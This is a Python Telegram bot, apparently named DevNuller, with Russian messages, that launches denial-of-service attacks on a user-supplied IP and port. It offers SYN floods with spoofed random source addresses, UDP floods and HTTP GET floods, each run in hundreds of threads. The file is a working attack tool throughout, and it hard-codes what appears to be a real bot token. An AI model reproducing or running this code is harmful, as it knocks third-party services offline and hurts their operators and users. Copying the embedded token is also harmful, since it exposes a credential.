#!/usr/bin/env python3
import logging, threading, random, time, os, sys
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes, ConversationHandler

# ---------- конфиг ----------
BOT_TOKEN = "8361218336:AAEEq7nxX0QEzzvIdoiNaCnRKwBrjfN4XzQ"
AUTHORIZED_USERS = [6978646199]
# --------------------------

logging.basicConfig(level=logging.INFO)

# Проверим scapy
try:
    from scapy.all import IP, TCP, UDP, send, RandIP
except ImportError:
    import subprocess
    subprocess.check_call([sys.executable, "-m", "pip", "install", "scapy"])
    from scapy.all import IP, TCP, UDP, send, RandIP

# Глобальные переменные атаки
attack_threads = []
stop_event = threading.Event()
running_attack = None  # хранит информацию о текущей атаке

# Состояния для ConversationHandler
ATYPE, TARGET_IP, TARGET_PORT, THREADS_COUNT, CONFIRM = range(5)

# Доступ
def auth_guard(update: Update):
    uid = update.effective_user.id
    return uid in AUTHORIZED_USERS

# Стартовое меню
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not auth_guard(update):
        await update.message.reply_text("Ты не авторизован.")
        return ConversationHandler.END
    keyboard = [
        [InlineKeyboardButton("SYN-флуд (мощный, анонимный)", callback_data='syn')],
        [InlineKeyboardButton("UDP-флуд", callback_data='udp')],
        [InlineKeyboardButton("HTTP-флуд (слабый, но рабочий)", callback_data='http')],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("Выбери тип атаки:", reply_markup=reply_markup)
    return ATYPE

# Выбор типа
async def choose_type(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    context.user_data['atype'] = query.data
    await query.edit_message_text(f"Тип: {query.data}. Теперь введи IP цели:")
    return TARGET_IP

# Ввод IP
async def enter_ip(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ip = update.message.text.strip()
    # Простая проверка
    parts = ip.split('.')
    if len(parts) != 4 or not all(p.isdigit() for p in parts):
        await update.message.reply_text("Неверный IP. Введи ещё раз:")
        return TARGET_IP
    context.user_data['target_ip'] = ip
    await update.message.reply_text("Введи порт (обычно 80):")
    return TARGET_PORT

# Ввод порта
async def enter_port(update: Update, context: ContextTypes.DEFAULT_TYPE):
    port = update.message.text.strip()
    if not port.isdigit():
        await update.message.reply_text("Порт должен быть числом. Попробуй снова:")
        return TARGET_PORT
    context.user_data['target_port'] = int(port)
    await update.message.reply_text("Сколько потоков запустить? (рекомендую 500-1000):")
    return THREADS_COUNT

# Ввод потоков
async def enter_threads(update: Update, context: ContextTypes.DEFAULT_TYPE):
    th = update.message.text.strip()
    if not th.isdigit():
        await update.message.reply_text("Нужно число. Введи количество потоков:")
        return THREADS_COUNT
    context.user_data['threads'] = int(th)
    # Сводка
    summary = (
        f"Запустить атаку?\n"
        f"Тип: {context.user_data['atype']}\n"
        f"IP: {context.user_data['target_ip']}\n"
        f"Порт: {context.user_data['target_port']}\n"
        f"Потоков: {context.user_data['threads']}"
    )
    keyboard = [
        [InlineKeyboardButton("Запуск!", callback_data='confirm'),
         InlineKeyboardButton("Отмена", callback_data='cancel')]
    ]
    await update.message.reply_text(summary, reply_markup=InlineKeyboardMarkup(keyboard))
    return CONFIRM

# Подтверждение и запуск
async def confirm_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data == 'cancel':
        await query.edit_message_text("Отменено.")
        return ConversationHandler.END

    global stop_event, attack_threads, running_attack
    stop_event.clear()
    attack_threads = []
    atype = context.user_data['atype']
    target_ip = context.user_data['target_ip']
    target_port = context.user_data['target_port']
    threads_count = context.user_data['threads']

    if atype == 'syn':
        worker = syn_worker
    elif atype == 'udp':
        worker = udp_worker
    else:
        worker = http_worker

    for _ in range(threads_count):
        t = threading.Thread(target=worker, args=(target_ip, target_port))
        t.daemon = True
        t.start()
        attack_threads.append(t)

    running_attack = {
        'type': atype,
        'target': f"{target_ip}:{target_port}",
        'threads': threads_count
    }
    await query.edit_message_text(
        f"Атака {atype} на {target_ip}:{target_port} запущена в {threads_count} потоков.\n"
        "Для остановки нажми /stop или кнопку ниже."
    )
    # Добавим кнопку "Стоп" в следующем сообщении
    keyboard = [[InlineKeyboardButton("Остановить атаку", callback_data='stop_attack')]]
    await context.bot.send_message(chat_id=update.effective_chat.id, 
                                   text="Управление:", 
                                   reply_markup=InlineKeyboardMarkup(keyboard))
    return ConversationHandler.END

# Обработчик кнопки "Стоп" вне диалога
async def stop_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if not auth_guard(update):
        return
    global stop_event
    stop_event.set()
    if running_attack:
        await query.edit_message_text(f"Атака на {running_attack['target']} остановлена.")
    else:
        await query.edit_message_text("Атака остановлена.")

# Рабочие потоки
def syn_worker(ip, port):
    while not stop_event.is_set():
        try:
            src = RandIP()
            pkt = IP(src=src, dst=ip)/TCP(sport=random.randint(1024,65535), dport=port, flags='S')
            send(pkt, verbose=0)
        except:
            pass

def udp_worker(ip, port):
    while not stop_event.is_set():
        try:
            pkt = IP(dst=ip)/UDP(sport=random.randint(1024,65535), dport=port)/Raw(load=os.urandom(1400))
            send(pkt, verbose=0)
        except:
            pass

def http_worker(ip, port):
    import socket
    while not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.3)
            s.connect((ip, port))
            s.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\n\r\n".encode())
            s.close()
        except:
            pass

# Команда /stop (дублирующая)
async def stop_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not auth_guard(update):
        return
    global stop_event
    stop_event.set()
    await update.message.reply_text("Остановка атаки запрошена.")

def main():
    app = Application.builder().token(BOT_TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            ATYPE: [CallbackQueryHandler(choose_type)],
            TARGET_IP: [MessageHandler(filters.TEXT & ~filters.COMMAND, enter_ip)],
            TARGET_PORT: [MessageHandler(filters.TEXT & ~filters.COMMAND, enter_port)],
            THREADS_COUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, enter_threads)],
            CONFIRM: [CallbackQueryHandler(confirm_attack, pattern='^(confirm|cancel)$')]
        },
        fallbacks=[CommandHandler('start', start)]
    )

    app.add_handler(conv_handler)
    app.add_handler(CallbackQueryHandler(stop_button, pattern='^stop_attack$'))
    app.add_handler(CommandHandler('stop', stop_cmd))

    print("Бот DevNuller запущен. Жми /start для атаки.")
    app.run_polling()

if __name__ == '__main__':
    main()